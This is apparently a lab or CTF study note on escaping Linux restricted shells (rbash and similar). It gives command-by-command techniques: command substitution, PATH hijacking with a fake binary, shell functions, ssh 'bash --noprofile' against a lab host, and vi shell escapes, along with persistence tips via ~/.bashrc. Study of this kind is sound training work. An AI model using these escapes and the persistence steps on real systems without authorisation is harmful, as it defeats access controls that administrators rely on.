### 1. Technique Name:

Escaping Restricted Shells
### 2. Summary:

Restricted shells (such as `rbash`, `rksh`, `rzsh`) are limited versions of standard Linux shells meant to constrain user actions. These restrictions may prevent changing directories, running non-whitelisted commands, or setting environment variables. However, creative abuse of shell behavior—especially command substitution, chaining, or improper script handling—can allow an attacker to bypass these controls and regain full shell access.
### 3. Conditions / Requirements:

- Access to a restricted shell session (e.g., via SSH or a restricted user account)    
- One or more of the following must be permitted:
    - Command substitution or variable expansion
    - Ability to define or call functions 
    - Permission to modify environment variables    
    - Access to binaries like `vi`, `less`, `awk`, `bash`, `scp`, etc.
### 4. Enumeration Steps:
#### A. Determine Shell Type:

```bash
echo $0
ps -p $$
```
#### B. Check Shell Capabilities:

Try common commands:

```bash
cd /
export PATH=/tmp
bash
```

Check environment:

```bash
env
echo $PATH
```
### 5. Exploitation Steps:
#### A. Command Substitution:

```bash
ls -l `pwd`
```

→ Executes `pwd` even if it's not directly allowed
#### B. Command Chaining:

```bash
ls -l; whoami
```

→ Semicolon chains commands
#### C. Command Execution via Built-ins:

```bash
echo $(id)
```

→ Executes `id` using command substitution
#### D. Modifying PATH:

```bash
export PATH=.:$PATH
echo "/bin/bash" > ls
chmod +x ls
./ls
```

→ Hijacks a built-in command with a malicious binary
#### E. Using Shell Functions:

```bash
foo() { /bin/bash; }
foo
```
#### F. Launching an Unrestricted Shell via SSH:

```bash
ssh htb-user@10.129.37.149 -t "bash --noprofile"
```

→ This bypasses restrictions imposed by login shell configuration by directly invoking `bash` without sourcing profiles
#### G. Spawning Shells from Allowed Binaries:

If binaries like `vi`, `less`, `awk`, or `python` are accessible:

```bash
vi
:set shell=/bin/bash
:shell
```
### 6. Post-Exploitation Tips:

- Always clean up artifacts like temporary functions or PATH hijack binaries    
- After escaping, assess what new access you have (e.g., can you now modify files or escalate privileges?)
- Use `tty` and `script` utilities to stabilize shell if needed
- If persistence is needed, consider writing to `~/.bashrc` or `~/.profile` if writeable
### 7. Example / Notes:

- Command substitution inside `ls`:
   
```bash
ls -l `pwd`
```
 
- SSH bypass with `--noprofile`:
   
```bash
ssh htb-user@10.129.37.149 -t "bash --noprofile"
```
 
   → Prevents restrictive profiles like `.bash_profile` or `.bashrc` from being sourced

- PATH injection trick:
   
```bash
echo "/bin/bash" > fake
chmod +x fake
export PATH=.:$PATH
fake
```
 
- Command chaining to abuse relaxed syntax:

```bash
echo Hello; /bin/bash
```
# Tags
> #Linux-Post-Exploitation #Linux-Privesc #Restricted_Shell_Escape